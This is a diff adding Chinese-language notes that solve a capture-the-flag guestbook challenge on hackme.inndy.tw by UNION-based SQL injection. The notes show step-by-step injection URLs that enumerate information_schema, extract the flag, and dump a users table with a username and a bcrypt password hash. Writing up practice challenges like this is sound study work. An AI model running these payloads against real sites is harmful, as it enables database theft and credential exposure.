@@ -1,0 +1,79 @@
+﻿注入
+
+/***************************************************/
+https://hackme.inndy.tw/gb/?mod=read&id=-1
+Sorry, no data for this
+
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,database(),4
+Post -- 2
+guestbook
+
+at 4
+/***************************************************/
+https://hackme.inndy.tw/gb/?mod=read&id=1
+Post -- hello
+asdf
+
+at 2017-08-02 23:48:10
+
+
+https://hackme.inndy.tw/gb/?mod=read&id=1 union select 1,2,database(),4
+Post -- hello
+asdf
+
+at 2017-08-02 23:48:10
+/***************************************************/
+从数据库搜索的内容，在web页面只是显示一条。所以id=-1才能住人。
+
+select 1,2，database()，4   是因为前面搜索的内容有4列。
+也可以是select 1,1，1,database()  select database(),a,b,c
+从结果看 显示的内容 分别是第2、3、4列
+
+在
+https://hackme.inndy.tw/gb/?mod=read&id=1
+Post -- hello
+asdf
+
+at 2017-08-02 23:48:10中
+
+1		2		3		4
+id		title	content	time
+1		hello	asdf	2017-08-02 23:48:10
+/***************************************************/
+数据库guestbook
+select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='guestbook' limit 0,1
+
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='guestbook' limit 0,1),4
+可以得到表 flag
+同样能找到表 posts users
+
+select column_name from information_schema.columns where table_name='flag' limit 0,1
+
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='flag' limit 0,1),4
+得到列 id flag padding0 padding
+
+select flag from gusetbook.flag limit 0,1
+
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select flag from guestbook.flag limit 0,1),4
+
+http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif
+FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342>123123#}
+http://i.giphy.com/m7BTtLWhjkEJa.gif
+
+/**********************************************************************/
+额外的
+
+select schema_name from schemata;
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select schema_name from information_schema.schemata limit 0,1),4
+
+数据库包含 information_schema guestbook
+
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='users' limit 0,1),4
+
+表users 元素 uid name pass
+
+https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select name from guestbook.users limit 0,1),4
+
+name： inndy 
+pass： $2y$10$BKoDK0G7rQCciQDkiGOlkebx/8tQOe43h9dqo1LT6o8nHTY1zd..e
+
